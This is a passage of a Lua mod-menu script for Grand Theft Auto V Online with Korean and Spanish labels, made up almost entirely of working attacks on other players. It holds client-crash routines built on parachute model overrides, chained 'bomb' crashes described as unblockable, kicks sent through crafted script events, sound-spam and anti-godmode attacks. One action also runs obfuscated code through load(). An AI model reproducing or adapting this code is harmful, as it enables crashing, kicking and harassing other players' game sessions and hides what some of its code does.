                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    local nmcrashes = menu.list(twotake, "유사 모델 크래쉬", {}, "")

    menu.action(nmcrashes, "강제종료 V1", {"bigyachtyv1"}, "크래쉬 이벤트 (A1:EA0FF6AD) 요트 모델 보내기.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "강제종료 V2", {"bigyachtyv2"}, "크래쉬 이벤트(A1:E8958704)프로요흐트001을 보내기.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(nmcrashes, "강제종료 V3", {"bigyachtyv3"}, "크래쉬 이벤트(A1:1A7AEACE)프로요흐트002을 보내기.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(nmcrashes, "강제종료 V4", {"bigyachtyv4"}, "크래시 이벤트 (A1:408D3AA0)프로파야흐트를 보내기.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)
    
    menu.action(nmcrashes, "강제종료 V5", {"bigyachtyv5"}, "크래쉬 이벤트 (A1:B36122B5) 프로파야흐트를 보내기.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    --menu.action(crashes, "Inbloqueable V4 'Test'", {"crashv4"}, "Deberia estar arreglado por ahora", function()
    --    local mdl = util.joaat("apa_mp_apa_yacht")
    --    local user = PLAYER.PLAYER_PED_ID()
    --    local ped_pos = players.get_position(player_id)
    --   BlockSyncs(player_id, function()
    --        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    --        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    --        PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    --        util.yield(50)
    --        local pos = players.get_position(player_id)
    --        pos.z += 300
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, ped_pos, false, false, false)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) == 0
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        util.yield(50)
    --        TASK.CLEAR_PED_TASKS(user)
    --        util.yield(50)
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    --        ENTITY.SET_ENTITY_COORDS(user, ped_pos, false, false)
    --    end)
    --end)


    --menu.action(crashes, "Crash V5 'Test'", {""}, "Un crash antiguo de prisuhm, intente arreglarlo y mejorarlo.", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    --    end)
    --end)
    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "(패스 워시)") -- Thx to every single stand developper that worked on this <3

    local c
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local kitteh_hash = util.joaat("a_c_cat_01")
    ryze.request_model_load(kitteh_hash)

    local crash_tbl = {
        "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
        "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
        "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
    }

    local crash_tbl_2 = {
        {17, 32, 48, 69},
        {14, 30, 37, 46, 47, 63},
        {9, 27, 28, 60}
    }

    menu.action(crashes, "크래쉬 Pwayer", {"cwash"}, "나는 아직도 페이저와 충돌하는지 모르겠다.", function()
        if player_id == players.user() then 
            util.toast('실제로! 넌 너 자신을 속일 수 없어.. >_<')
            return 
        end

        if player_id == players.get_host() then 
            util.toast('실제로.. 불운한 방법, 호스트를 크래쉬 할 수 없습니다. >_<')
            return
        end

        local cur_crash_meth = ""
        local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
            cur_crash_meth = cur_crash_meth .. cur_crash
        end

        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""

        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end

        for k,v in pairs(crash_keys) do
            print(k + (k*128))
        end

        c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        ryze.request_model_load(kitteh_hash)
        local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
        -- i pwoimise no kittehs are hurt...
        AUDIO.PLAY_PAIN(kitteh, 7, 0)
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
        ryze.cwash_in_progwess()
        util.yield(500)
        for i=1, math.random(10000, 12000) do
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(player_id) .. '\")')
        pcall(crash_compiled_func)
        util.toast('bye bye! nya nya >_<')
    end)

    local cwcred = menu.list(crashes, "cwash를 도움을 준 사람들", {}, "No hay interpretacion de lo que eso significa, asi que cito textualmente \n무슨뜻인지 해석이 되지 않아 그대로 인용합니다.")

    menu.action(cwcred, "Pwisuhm", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "IcyPhoenix", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "LanceScwipt", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "Aaron", {}, "Helped in this cwash >.<", function() end)
    menu.action(cwcred, "And evewy one else.", {}, "Helped in this cwash >.<", function() end)


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.divider(crashes, "강력한 크래쉬")

    if menu.get_edition() >= 1 then 
        menu.action(crashes, "크래쉬 폭탄", {"tsarbomba"}, "PC 크래쉬, 좋은 PC가 없다면 사용하는 것을 추천하지 않는다 (잠금 해제 불가능 uwu)", function()
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("시작...")
            util.toast("친구야 잘가")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv5"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv6"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv7"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("ngcrash"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("footlettuce"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(1800)
            util.toast("모든 것이 깨끗해질 때까지 기다리세요")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 2 then
        menu.action(crashes, "차르 폭탄 V2", {"tsarbomba"}, "크래쉬 pc 좋은 pc가 없으면 사용을 추천하지 않습니다 (차단 불가 uwu) \n(잘 작동하려면 Regular 이상 버전이 필요합니다.\n상대에게 감지될 가능성이 높습니다.)", function()
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("시작...")
            util.toast("불쌍한 친구")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv29"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv91"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv97"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv84"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv51"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv5"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv6"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv7"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(1800)
            util.toast("모든 것이 사라질 때까지 기다려...")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 3 then
        menu.action(crashes, "스페셜 폭탄 크래쉬 (모델)", {"tsarbomba5"}, "crash 좋은 pc가 없으면 사용을 추천하지 않습니다 (차단 불가 uwu) \n(잘 작동하려면 스탠드 레귤러 이상 필요합니다. / 매우 가능성 있음 오버로드)", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("시작...")
            util.toast("불상한 친구")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv27"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv18"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv12"..players.get_name(player_id))
            util.yield(820)
            menu.trigger_commands("crashv10"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv13"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv14"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2800)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(200)
            --menu.trigger_commands("pipebomb"..players.get_name(player_id)) Posible Anticheat Concerns
            util.yield(400)
            menu.trigger_commands("smash"..players.get_name(player_id))
            if PLAYER.GET_VEHICLE_PED_IS_IN(ped, false) then
                menu.trigger_commands("slaughter"..players.get_name(player_id))
            end
            util.yield(1500)
            util.toast("모든 것이 깨끗해질 때까지 기다리세요")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    -- Structure premade for the next crash


    --menu.action(crashes, "Test", {}, "", function()
        --BlockSyncs(player_id, function()
        
        --end)
    
    
    
    --end)

    local kicks = menu.list(malicious, "킥 이벤트", {}, "")

    if menu.get_edition() >= 2 then
        menu.action(kicks, "킥 어댑터 V1", {}, "", function()
            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
            util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
            menu.trigger_commands("breakup" .. players.get_name(player_id))
        end)
    else
        menu.action(kicks, "킥 어댑터 V2", {}, "", function()
            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
            util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
        end)
    end

    local sekicks = menu.list(kicks, "킥스 바이 스크립트", {}, "")

    menu.action(sekicks, "스크립트 킥 v1", {}, "스탠드로 잠금 해제 가능.", function()
        util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
    end)

    menu.action(sekicks, "스크립트 킥 v2", {}, "", function()
        util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
    end)

    menu.action(sekicks, "스크립트 킥 v3", {}, "", function()
        util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
    end)

    menu.action(kicks, "디싱크 킥", {}, "", function()
        local model = util.joaat("MP_M_Freemode_01")
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local ped_ = entities.create_ped(1, model, pos, 0, true, false)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 0, 0, 0, 39, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 1, 104, 25, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 2, 49, 0, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 3, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 4, 84, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 5, 82, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 6, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 7, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 8, 97, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 9, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 10, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 11, 186, 0, 0)
        util.trigger_script_event(-227800145 << player_id, {player_id, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
    end)

    local scriptev = menu.list(malicious, "이벤트", {}, "스크립트로 인한 이벤트. \n유료 모드 메뉴를 사용하는 사용자는 감지할 수 있습니다.")

    menu.action(scriptev, "오류 1", {}, "많은 사람들이 소리를 들을 수 있도록 이벤트를 실행합니다.. \n유료 모드 메뉴를 사용하는 사용자는 감지할 수 있습니다", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "오류 2", {}, "많은 사람들이 그 소리를 들을 수 있도록 몇 가지 이벤트를 실행하세요. \n같은 방식을 가진 사람들은 당신을 감지할 수 있습니다.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ERROR", pc.x, pc.y, pc.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "오류 3", {}, "많은 사람들이 그 소리를 들을 수 있도록 몇 가지 이벤트를 실행하세요. \n지불 방식을 가진 사람들은 당신을 감지할 수 있습니다.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Hit", pc.x, pc.y, pc.z, "RESPAWN_ONLINE_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Teletransportar a LS", {}, "Los teletransportaras al final de una mision.", function()
        util.trigger_script_event(1 << player_id, {-168599209, players.user(), player_id, -1, 1, 1, 0, 1, 0})
    end)

    local antimodder = menu.list(malicious, "안티 모더", {}, "")
    local kill_godmode = menu.list(antimodder, "godmode로 플레이어를 죽입니다.", {}, "")
    menu.action(kill_godmode, "시간", {""}, "이 방법은 여러분이 사용하는 메뉴얼에서 작동하는데:", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "진압", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        request_model(vehicle)

        switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)   

    player_toggle_loop(antimodder, player_id, "무적모드 제거", {}, "많은 사람들이 그것을 차단한다", function()
        util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    player_toggle_loop(antimodder, player_id, "아르마 안티 무적모드", {}, "", function()
        for _, player_id in ipairs (players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(player_id) then
                util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
            end
        end
    end)

    --player_toggle_loop(antimodder, player_id, "Remover godmode de carro", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
    --        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --        ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
    --    end
    --end)

    --menu.action(antimodder, "Remover godmode de carro V2", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    --menu.toggle_loop(antimodder, "Remover godmode de carro V3", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    menu.action(trolling, "검은 화면", {}, "", function()
